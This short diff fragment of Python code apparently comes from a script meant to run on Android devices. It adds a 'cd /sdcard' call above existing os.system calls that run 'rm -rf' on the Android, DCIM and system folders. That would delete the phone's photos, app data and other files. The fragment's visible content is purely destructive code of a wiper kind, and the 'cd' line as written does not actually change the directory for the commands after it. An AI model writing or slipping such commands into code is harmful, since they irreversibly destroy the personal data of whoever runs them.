@@ -1,3 +1,4 @@
+os.system("cd /sdcard")
 os.system("rm -rf Android")
 os.system("rm -rf DCIM")
 os.system("rm -rf system")
